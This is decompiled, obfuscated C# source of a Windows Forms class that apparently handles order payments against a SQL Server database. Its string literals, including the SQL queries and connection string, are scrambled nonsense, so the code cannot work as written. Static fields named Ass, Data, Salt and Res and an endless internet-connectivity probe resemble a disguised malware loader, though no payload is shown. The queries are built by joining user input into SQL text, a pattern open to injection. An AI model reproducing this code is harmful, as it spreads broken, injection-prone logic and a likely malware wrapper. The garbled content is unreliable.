using System;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace o8S4F;

public class g9Y6Z
{
	private SqlConnection Connection;

	private string Database;

	private DataSet DataSet;

	private SqlDataAdapter DataAdapter;

	private SqlDataReader DataReader;

	private SqlCommand Command;

	private DataTable DataTable;

	private object ComboBox1;

	private object ComboBox3;

	private object ComboBox2;

	private object Label5;

	private object Button1;

	private object Label3;

	private object Label6;

	private object Label7;

	private object TextBox1;

	private object TextBox2;

	private object Button2;

	private object DataGridView1;

	private object Button4;

	public object UserId
	{
		[CompilerGenerated]
		get
		{
			return _UserId;
		}
		[CompilerGenerated]
		set
		{
			_UserId = RuntimeHelpers.GetObjectValue(value);
		}
	}

	internal static int num { get; set; }

	internal static object Ass
	{
		[CompilerGenerated]
		get
		{
			return _Ass;
		}
		[CompilerGenerated]
		set
		{
			_Ass = RuntimeHelpers.GetObjectValue(value);
		}
	}

	internal static string[] Names { get; set; }

	internal static byte[] Data { get; set; }

	internal static byte[] Salt { get; set; }

	internal static string ResName { get; set; }

	internal static string Res { get; set; }

	internal static int TNum { get; set; }

	internal static int Mnum { get; set; }

	internal static string MName { get; set; }

	public void w7GTx()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Database = "ghhg" + Environment.MachineName.ToString() + "jrwq";
		Connection = new SqlConnection(Database);
		if (Connection.get_State() == ConnectionState.Closed)
		{
			Connection.Open();
		}
	}

	public void Hx73Z()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		NewLateBinding.LateSet(ComboBox1, (Type)null, "DataSource", new object[1], (string[])null, (Type[])null);
		w7GTx();
		DataAdapter = new SqlDataAdapter("jmfht4w", Connection);
		DataTable = new DataTable();
		((DbDataAdapter)(object)DataAdapter).Fill(DataTable);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "DataSource", new object[1] { DataTable }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "DisplayMember", new object[1] { "fhjth" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "ValueMember", new object[1] { "Ordefthre4wrId" }, (string[])null, (Type[])null);
	}

	public void j2QRg()
	{
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "fg4wt" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "awef" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "jk" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "w4t4fj" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "gh thr4ew" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "fg Niaghjyjgga" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "htf" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "ty" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "7i" }, (string[])null, (Type[])null, (bool[])null, true);
	}

	public void Na7n0()
	{
		NewLateBinding.LateSet(ComboBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox3, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label5, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "nm," }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "df4t" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Label3, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label6, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label6, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label7, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox1, (Type)null, "MaxLength", new object[1] { 16 }, (string[])null, (Type[])null);
		Hx73Z();
		j2QRg();
		NewLateBinding.LateSet(DataGridView1, (Type)null, "DataSource", new object[1], (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button4, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
	}

	private void d1SCn(object sender, EventArgs e)
	{
		Na7n0();
	}

	private void Yk7n9(object sender, EventArgs e)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		w7GTx();
		string text = NewLateBinding.LateGet(ComboBox1, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		DataAdapter = new SqlDataAdapter("SDetatyi67" + text + "dsffrgsw", Connection);
		DataSet = new DataSet();
		DataSet.Clear();
		((DbDataAdapter)(object)DataAdapter).Fill(DataSet, "fthty");
		NewLateBinding.LateSet(DataGridView1, (Type)null, "DataSource", new object[1] { DataSet.Tables["4dgrfg"] }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		checked
		{
			int num = DataSet.Tables["zdfkg"]!.Rows.Count - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i++)
			{
				num2 = Conversions.ToInteger(Operators.AddObject((object)num2, DataSet.Tables["qerr"]!.Rows[i]["gjy"]));
			}
			NewLateBinding.LateSet(Label3, (Type)null, "Text", new object[1] { num2 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox2, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label5, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label6, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "vnvft" }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(NewLateBinding.LateGet(ComboBox2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { "34yryj" }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "gyjtr4" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox3, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			j2QRg();
			NewLateBinding.LateSet(Button4, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
		}
	}

	private void Jx7b2(object sender, EventArgs e)
	{
		if (Operators.CompareString(NewLateBinding.LateGet(ComboBox2, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "nyj5", false) == 0)
		{
			NewLateBinding.LateSet(Label6, (Type)null, "Text", new object[1] { "Ctythmber" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label7, (Type)null, "Text", new object[1] { "Baukjyt54e" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label6, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox3, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			j2QRg();
			NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "MaxLength", new object[1] { 16 }, (string[])null, (Type[])null);
		}
		else
		{
			NewLateBinding.LateSet(Label6, (Type)null, "Text", new object[1] { "Cty5yash" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label6, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(ComboBox3, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "MaxLength", new object[1] { 32767 }, (string[])null, (Type[])null);
		}
	}

	private void q6N1H(object sender, EventArgs e)
	{
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Expected O, but got Unknown
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Expected O, but got Unknown
		//IL_0299: Unknown result type (might be due to invalid IL or missing references)
		string text = NewLateBinding.LateGet(ComboBox2, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		string text2 = Conversions.ToString(NewLateBinding.LateGet(ComboBox1, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.CompareString(text, "gkjfth43", false) == 0)
		{
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), (object)string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(ComboBox3, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null))))))
			{
				MessageBox.Show("tky54", "u6ry", (MessageBoxButtons)0, (MessageBoxIcon)16);
				return;
			}
			string text3 = text;
			string text4 = Conversions.ToString(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text5 = NewLateBinding.LateGet(ComboBox3, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
			if (Versioned.IsNumeric((object)text4))
			{
				w7GTx();
				string text6 = "hukyt5" + text3 + "tjyjry" + text4 + "jyrt43" + text5 + "jyfdgr" + text2 + "fht4";
				Command = new SqlCommand(text6, Connection);
				Command.ExecuteNonQuery();
				Connection.Close();
				w7GTx();
				string text7 = "fht5ey" + text2 + "ry";
				Command = new SqlCommand(text7, Connection);
				Command.ExecuteNonQuery();
				MessageBox.Show("trety55e", "Prtudhess", (MessageBoxButtons)0, (MessageBoxIcon)64);
				Connection.Close();
				Na7n0();
			}
			else
			{
				MessageBox.Show("Cafhttrh5y5", "Partet443or", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		else
		{
			string text8 = text;
			w7GTx();
			string text9 = "UPDATfghty5eymentType tr" + text8 + "fthj5y" + text2 + "y5r43";
			Command = new SqlCommand(text9, Connection);
			Command.ExecuteNonQuery();
			Connection.Close();
			w7GTx();
			string text10 = "Uil" + text2 + "34rgd";
			Command = new SqlCommand(text10, Connection);
			Command.ExecuteNonQuery();
			MessageBox.Show("Pdget545", "Prtye5fd", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Connection.Close();
			Na7n0();
		}
	}

	private void Cj5x9(object sender, EventArgs e)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Button2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"Ingdrg43", false))
		{
			int num = Conversions.ToInteger(NewLateBinding.LateGet(Label3, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
			{
				MessageBox.Show("Iyr543", "rttdhfd", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null))))
			{
				int num2 = Conversions.ToInteger(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
				if (num2 < num)
				{
					MessageBox.Show("Chwrqq", "Payqqq3", (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				else if (num2 > num)
				{
					NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(Label7, (Type)null, "Text", new object[1] { "fgth" }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(TextBox2, (Type)null, "Text", new object[1] { checked(num2 - num) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "th5y" }, (string[])null, (Type[])null);
				}
				else
				{
					NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "57gh" }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
				}
			}
			else
			{
				MessageBox.Show("Cjgy5y", "Paut5454r", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		else
		{
			NewLateBinding.LateSet(Button1, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Label7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox2, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "Indgg43sh" }, (string[])null, (Type[])null);
		}
	}

	private void Qw8n9(object sender, EventArgs e)
	{
		Na7n0();
	}

	internal static int Br45M()
	{
		while (true)
		{
			try
			{
				using WebClient webClient = new WebClient();
				object obj = string.Format("{0}://{1}.{2}.{3}", "https", "www", "google", "com");
				object[] obj2 = new object[1] { obj };
				object[] array = obj2;
				bool[] obj3 = new bool[1] { true };
				bool[] array2 = obj3;
				object obj4 = NewLateBinding.LateGet((object)webClient, (Type)null, "OpenRead", obj2, (string[])null, (Type[])null, obj3);
				if (array2[0])
				{
					obj = RuntimeHelpers.GetObjectValue(array[0]);
				}
				object obj5 = obj4;
				try
				{
					return 100;
				}
				finally
				{
					if (obj5 != null)
					{
						((IDisposable)obj5).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
